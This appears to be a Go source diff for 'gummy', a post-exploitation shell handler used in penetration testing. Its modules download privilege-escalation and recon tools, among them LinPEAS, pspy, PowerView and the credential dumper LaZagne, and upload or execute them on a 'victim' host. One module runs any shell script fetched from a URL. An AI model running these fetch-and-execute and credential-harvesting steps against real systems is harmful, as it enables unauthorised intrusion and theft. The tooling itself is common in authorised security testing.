@@ -3,19 +3,13 @@ package internal
 import (
 	"context"
 	"fmt"
-	"os"
-	"path/filepath"
 	"sort"
-	"strings"
-	"time"
-
-	"github.com/chsoares/gummy/internal/ui"
 )
 
 // Module interface for all gummy modules
 type Module interface {
-	Name() string        // Module identifier (e.g., "enum", "lse", "peas")
-	Category() string    // Category (e.g., "Enumeration", "Privilege Escalation")
+	Name() string        // Module identifier (e.g., "peas", "lse", "sh")
+	Category() string    // Category (e.g., "Linux", "Windows", "Misc", "Custom")
 	Description() string // Short description
 	Run(session *SessionInfo, args []string) error
 }
@@ -32,8 +26,11 @@ func GetModuleRegistry() *ModuleRegistry {
 	if globalRegistry == nil {
 		globalRegistry = NewModuleRegistry()
 		// Register built-in modules
-		globalRegistry.Register(&EnumModule{})
+		globalRegistry.Register(&PEASModule{})
 		globalRegistry.Register(&LSEModule{})
+		globalRegistry.Register(&PSPYModule{})
+		globalRegistry.Register(&PrivescModule{})
+		globalRegistry.Register(&ShellScriptModule{})
 	}
 	return globalRegistry
 }
@@ -91,151 +88,161 @@ func (r *ModuleRegistry) ListByCategory() map[string][]Module {
 }
 
 // ============================================================================
-// Built-in Modules
+// Module URLs (from Penelope)
 // ============================================================================
 
-// EnumModule - Basic system enumeration
-type EnumModule struct{}
+const (
+	// Linux
+	URL_LINPEAS = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
+	URL_LSE     = "https://github.com/chsoares/linux-smart-enumeration/raw/refs/heads/master/lse.sh"
+	URL_DEEPCE  = "https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh"
+	URL_PSPY64  = "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"
+	URL_PSPY32  = "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32"
 
-func (m *EnumModule) Name() string        { return "enum" }
-func (m *EnumModule) Category() string    { return "Enumeration" }
-func (m *EnumModule) Description() string { return "Basic system enumeration (user, network, sudo, SUID)" }
+	// Windows
+	URL_WINPEAS      = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe"
+	URL_POWERUP      = "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1"
+	URL_PRIVESCCHECK = "https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1"
+	URL_LAZAGNE      = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe"
+	URL_SHARPUP      = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe"
+	URL_POWERVIEW    = "https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Recon/PowerView.ps1"
+)
 
-func (m *EnumModule) Run(session *SessionInfo, args []string) error {
-	timestamp := time.Now().Format("2006_01_02-15_04_05")
-	outputPath := filepath.Join(session.ScriptsDir(), timestamp+"-enum-output.txt")
+// Script lists for privesc module
+var linuxPrivescScripts = []string{
+	URL_LINPEAS,
+	URL_LSE,
+	URL_DEEPCE,
+}
 
-	// Basic enumeration commands
-	commands := []string{
-		"echo '=== System Info ==='",
-		"uname -a",
-		"cat /etc/os-release 2>/dev/null || cat /etc/issue",
-		"echo ''",
-		"echo '=== User Info ==='",
-		"id",
-		"whoami",
-		"groups",
-		"echo ''",
-		"echo '=== Network ==='",
-		"ip addr 2>/dev/null || ifconfig",
-		"echo ''",
-		"echo '=== Sudo Privileges ==='",
-		"sudo -l 2>/dev/null || echo 'Cannot check sudo'",
-		"echo ''",
-		"echo '=== SUID Files (top 20) ==='",
-		"find / -perm -4000 -type f 2>/dev/null | head -20",
-		"echo ''",
-		"echo '=== Writable Directories (top 20) ==='",
-		"find / -writable -type d 2>/dev/null | grep -v '/proc/' | grep -v '/sys/' | head -20",
-	}
+var windowsPrivescScripts = []string{
+	URL_WINPEAS,
+	URL_POWERUP,
+	URL_PRIVESCCHECK,
+	URL_LAZAGNE,
+	URL_SHARPUP,
+	URL_POWERVIEW,
+}
 
-	script := strings.Join(commands, "\n")
+// ============================================================================
+// Linux Modules
+// ============================================================================
 
-	// Save script locally
-	scriptPath := filepath.Join(session.ScriptsDir(), timestamp+"-enum.sh")
-	if err := os.WriteFile(scriptPath, []byte(script), 0755); err != nil {
-		return fmt.Errorf("failed to write script: %w", err)
-	}
+// PEASModule - LinPEAS privilege escalation scanner
+type PEASModule struct{}
 
-	fmt.Println(ui.Success(fmt.Sprintf("Created script: %s", filepath.Base(scriptPath))))
+func (m *PEASModule) Name() string        { return "peas" }
+func (m *PEASModule) Category() string    { return "Linux" }
+func (m *PEASModule) Description() string { return "Run LinPEAS privilege escalation scanner" }
 
-	// Upload to victim
-	fmt.Println(ui.Info("Uploading enumeration script to victim..."))
-	t := NewTransferer(session.Conn, session.ID)
-	ctx := context.Background()
-
-	remotePath := "/tmp/gummy_enum.sh"
-	if err := t.Upload(ctx, scriptPath, remotePath); err != nil {
-		return fmt.Errorf("upload failed: %w", err)
-	}
-
-	// Make executable
-	session.Handler.SendCommand(fmt.Sprintf("chmod +x %s\n", remotePath))
-	time.Sleep(200 * time.Millisecond)
-
-	// Open terminal for output
-	tailCmd := fmt.Sprintf("tail -n +1 -f %s", outputPath)
-	fmt.Println(ui.Info(fmt.Sprintf("Output file: %s", outputPath)))
-
-	if err := OpenTerminal(tailCmd); err != nil {
-		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
-		fmt.Println(ui.Info(fmt.Sprintf("Manually run: tail -f %s", outputPath)))
-	}
-
-	// Execute remotely with streaming output
-	fmt.Println(ui.Info("Executing enumeration script on victim..."))
-
-	go func() {
-		if err := session.Handler.ExecuteWithStreaming(fmt.Sprintf("bash %s", remotePath), outputPath); err != nil {
-			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
-			return
-		}
-
-		fmt.Println(ui.Success(fmt.Sprintf("Enumeration complete! Output saved to: %s", filepath.Base(outputPath))))
-	}()
-
-	return nil
+func (m *PEASModule) Run(session *SessionInfo, args []string) error {
+	return session.RunScript(URL_LINPEAS, args)
 }
 
 // LSEModule - Linux Smart Enumeration
 type LSEModule struct{}
 
 func (m *LSEModule) Name() string        { return "lse" }
-func (m *LSEModule) Category() string    { return "Privilege Escalation" }
-func (m *LSEModule) Description() string { return "Linux Smart Enumeration (LSE)" }
+func (m *LSEModule) Category() string    { return "Linux" }
+func (m *LSEModule) Description() string { return "Run Linux Smart Enumeration" }
 
 func (m *LSEModule) Run(session *SessionInfo, args []string) error {
-	// LSE is a single shell script
-	url := "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh"
+	// Default to -l1 if no args provided
+	if len(args) == 0 {
+		args = []string{"-l1"}
+	}
+	return session.RunScript(URL_LSE, args)
+}
 
-	timestamp := time.Now().Format("2006_01_02-15_04_05")
-	scriptPath := filepath.Join(session.ScriptsDir(), timestamp+"-lse.sh")
-	outputPath := filepath.Join(session.ScriptsDir(), timestamp+"-lse-output.txt")
+// PSPYModule - Monitor processes without root (pspy64)
+type PSPYModule struct{}
 
-	// Download
-	fmt.Println(ui.Info("Downloading LSE from GitHub..."))
-	if err := DownloadFile(url, scriptPath); err != nil {
-		return err
+func (m *PSPYModule) Name() string        { return "pspy" }
+func (m *PSPYModule) Category() string    { return "Linux" }
+func (m *PSPYModule) Description() string { return "Monitor processes without root (pspy64)" }
+
+func (m *PSPYModule) Run(session *SessionInfo, args []string) error {
+	// Default to pspy64, but could add detection for 32-bit systems
+	return session.RunBinary(URL_PSPY64, args)
+}
+
+// ============================================================================
+// Windows Modules
+// ============================================================================
+
+// (Future: WinPEAS, PowerUp, etc.)
+
+// ============================================================================
+// Misc Modules
+// ============================================================================
+
+// PrivescModule - Upload multiple privesc scripts at once
+type PrivescModule struct{}
+
+func (m *PrivescModule) Name() string        { return "privesc" }
+func (m *PrivescModule) Category() string    { return "Misc" }
+func (m *PrivescModule) Description() string { return "Upload multiple privilege escalation scripts" }
+
+func (m *PrivescModule) Run(session *SessionInfo, args []string) error {
+	var scripts []string
+
+	// Select scripts based on detected platform
+	switch session.Platform {
+	case "linux", "unix", "":
+		scripts = linuxPrivescScripts
+	case "windows":
+		scripts = windowsPrivescScripts
+	default:
+		scripts = linuxPrivescScripts // Default to Linux
 	}
 
-	// Upload
-	fmt.Println(ui.Info("Uploading LSE to victim..."))
-	t := NewTransferer(session.Conn, session.ID)
-	remotePath := "/tmp/lse.sh"
-	if err := t.Upload(context.Background(), scriptPath, remotePath); err != nil {
-		return err
-	}
+	// Upload each script using Transferer (handles download + upload with nice output)
+	for _, url := range scripts {
+		filename := getFilenameFromURL(url)
 
-	// Make executable
-	session.Handler.SendCommand(fmt.Sprintf("chmod +x %s\n", remotePath))
-	time.Sleep(200 * time.Millisecond)
-
-	// Determine LSE level from args (default: -l1)
-	level := "-l1"
-	if len(args) > 0 && (args[0] == "-l0" || args[0] == "-l1" || args[0] == "-l2") {
-		level = args[0]
-	}
-
-	// Open terminal
-	tailCmd := fmt.Sprintf("tail -n +1 -f %s", outputPath)
-	fmt.Println(ui.Info(fmt.Sprintf("Output file: %s", outputPath)))
-
-	if err := OpenTerminal(tailCmd); err != nil {
-		fmt.Println(ui.Warning(fmt.Sprintf("Terminal error: %v", err)))
-		fmt.Println(ui.Info(fmt.Sprintf("Manually run: tail -f %s", outputPath)))
-	}
-
-	// Execute with streaming output
-	fmt.Println(ui.Info(fmt.Sprintf("Running LSE on victim (level: %s)...", level)))
-
-	go func() {
-		if err := session.Handler.ExecuteWithStreaming(fmt.Sprintf("bash %s %s", remotePath, level), outputPath); err != nil {
-			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
-			return
+		// Download locally to temp with unique name
+		localPath := fmt.Sprintf("/tmp/gummy_%s", filename)
+		if err := DownloadFile(url, localPath); err != nil {
+			continue
 		}
 
-		fmt.Println(ui.Success(fmt.Sprintf("LSE complete! Output saved to: %s", filepath.Base(outputPath))))
-	}()
+		// Upload to victim's CWD with original filename
+		t := NewTransferer(session.Conn, session.ID)
+		t.Upload(context.Background(), localPath, filename)
+	}
 
 	return nil
+}
+
+// Helper to extract filename from URL
+func getFilenameFromURL(url string) string {
+	// Simple extraction: get last part after /
+	for i := len(url) - 1; i >= 0; i-- {
+		if url[i] == '/' {
+			return url[i+1:]
+		}
+	}
+	return url
+}
+
+// ============================================================================
+// Custom Modules
+// ============================================================================
+
+// ShellScriptModule - Run arbitrary shell script from URL
+type ShellScriptModule struct{}
+
+func (m *ShellScriptModule) Name() string        { return "sh" }
+func (m *ShellScriptModule) Category() string    { return "Custom" }
+func (m *ShellScriptModule) Description() string { return "Run arbitrary shell script from URL" }
+
+func (m *ShellScriptModule) Run(session *SessionInfo, args []string) error {
+	if len(args) == 0 {
+		return fmt.Errorf("usage: run sh <url> [script args...]")
+	}
+
+	url := args[0]
+	scriptArgs := args[1:]
+
+	return session.RunScript(url, scriptArgs)
 }
